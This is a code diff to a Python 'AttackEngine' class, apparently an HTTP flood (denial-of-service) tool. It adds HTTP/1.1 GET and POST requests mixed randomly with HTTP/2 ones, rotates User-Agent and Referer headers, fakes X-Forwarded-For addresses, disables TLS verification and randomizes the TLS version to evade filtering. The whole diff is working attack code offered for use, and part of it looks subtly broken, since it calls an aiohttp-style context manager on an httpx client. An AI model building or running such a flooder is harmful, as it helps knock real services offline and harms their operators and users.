@@ -89,6 +89,23 @@ class AttackEngine:
         except:
             return "ERROR"
 
+    async def make_request_http1(self, session):
+        method = choice(["GET", "POST"])
+        headers = {
+            "User-Agent": choice(USER_AGENTS),
+            "Referer": choice(REFERERS),
+            "X-Forwarded-For": f"{self.stats['total'] % 255}.{self.stats['success'] % 255}.2.2"
+        }
+        try:
+            if method == "GET":
+                async with session.get(self.target, headers=headers, ssl=False) as resp:
+                    return "SUCCESS" if resp.status == 200 else "ERROR"
+            else:
+                async with session.post(self.target, headers=headers, ssl=False) as resp:
+                    return "SUCCESS" if resp.status == 200 else "ERROR"
+        except:
+            return "ERROR"
+
     async def run_attack(self):
         if self.use_proxies:
             connector = aiohttp.TCPConnector(limit=None, ssl=False)
@@ -102,9 +119,10 @@ class AttackEngine:
         else:
             limits = httpx.Limits(max_connections=self.max_concurrent)
             tls_version = self.random_tls_version()
+            # Randomize TLS version (TLSv1.2 or TLSv1.3)
             async with httpx.AsyncClient(http2=True, timeout=REQUEST_TIMEOUT, limits=limits, verify=False) as client:
                 while time.time() - self.start_time < self.duration:
-                    tasks = [self.make_request_http2(client) for _ in range(self.max_concurrent)]
+                    tasks = [self.make_request_http2(client) if random.choice([True, False]) else self.make_request_http1(client) for _ in range(self.max_concurrent)]
                     results = await asyncio.gather(*tasks, return_exceptions=False)
                     self.update_stats(results)
                     self.print_status()
